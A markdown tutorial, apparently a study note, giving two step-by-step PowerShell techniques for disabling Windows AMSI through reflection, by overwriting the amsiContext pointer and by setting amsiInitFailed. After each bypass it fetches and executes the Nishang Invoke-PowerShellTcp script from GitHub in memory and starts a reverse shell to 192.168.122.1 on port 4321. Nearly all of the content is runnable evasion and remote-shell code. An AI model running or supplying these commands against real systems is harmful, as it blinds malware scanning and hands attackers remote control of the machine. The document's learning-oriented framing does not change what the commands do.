## Bypass #1

The first bypass consists in modifying one field of the `System.Management.Automation.AmsiUtils` class, is an internal .NET class within PowerShell that interacts with the Antimalware Scan Interface (AMSI). The field we're interested specifically in is the `amsiContext` field.

To bypass AMSI, execute the following code within the powershell process:
- Create variable field
```powershell
$fields=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static')
```
- Uses the reflection feature of powershell. Using the reflection mechanism a process is able to inspect it's own memory, see it's own functions, see the code, and modify itself in memory. 
- Extract the different fields. 

- Create AMSI context
```powershell
$amsiContext=$fields | Where-Object { $_ -like "*Context" }
```
- Extract from fields one that ends in Context (amsiContext)

- Create a pointer to the context
```powershell
[IntPtr]$amsiContextPointer=$amsiContext.GetValue($null)
```
- Grab the value of the field and cast it to a int pointer

- Create an empty buffer
```powershell
[Int32[]]$emptyBuffer = @(0);
```

- Overwrite the context with the empty buffer
```powershell
[System.Runtime.InteropServices.Marshal]::Copy($emptyBuffer, 0, $amsiContextPointer, 1)
```
- Copy in this context is also called `manage memory copy`

Now, execute it again
```powershell
iex (iwr "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" -UseBasicParsing).Content
```

Notice that now, no error appears. You can then start a reverse shell.
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.122.1 -Port 4321
```

**Bypass #1 Added Information**

- View Class
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

- Get all the fields and add them into the variable `$fields`
```powershell
$fields=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static')
```

- View fields
```powershell
$fields
```
Shows fields:
- amsiLockObject
- amsiInitFailed
- amsiSession
- amsiContext

- Grab specific field. Here we grab amsiContext
```powershell
$fields | Where-Object { $_ -like "*Context" }
```

- We can also be even more specific
```powershell
$fields | Where-Object { $_Name -like "*Context" }
```

- equal (`-eq)
```powershell
$fields | Where-Object { $_Name -eq "*Context" }
```

Sometimes anti-virus does not allow certain strings which is why we use the `*` (give me the field where the name ends in Context, and starts with whatever)

- View field
```powershell
$amsiContext
```

- View pointer
```powershell
$amsiContextPointer
```

**Important:** You have to run the full command before some of these commands will work. So if you get an error you haven't added anything to the variable yet. Use the Bypass #1 commands to add them to the variables and then you can view what's inside. 
- Example

```powershell
[IntPtr]$amsiContextPointer=$amsiContext.GetValue($null)
```

```powershell
$amsiContextPointer
```

- use gdb to see what the pointer is in Hex
```sh
gdb -q
```

```sh
p/x <NUMBER>
```
- Shows the memory value of the PowerShell process.

## Bypass #2

The second method consist in setting the `amsiInitFailed` field to `true` within the `AmsiUtils` class.

```powershell
$amsiInitFailedField=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static') | Where-Object { $_.Name -like "amsiInitFailed" }
```

```powershell
$amsiInitFailedField.SetValue($null, $true)
```

```powershell 
iex (iwr "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" -UseBasicParsing).Content
```

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.122.1 -Port 4321
```

What if we save the file on disk and not in memory?:
```powershell
iex (iwr "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" -Outfile test.ps1
```
- This would trigger an event in the system, so the anti-virus will detect it. It's not called by AMSI, it's called by the `you wrote to a file` event.

Malware regularly uses packing to hide itself. Packing is when you hive the malicious code inside another program.
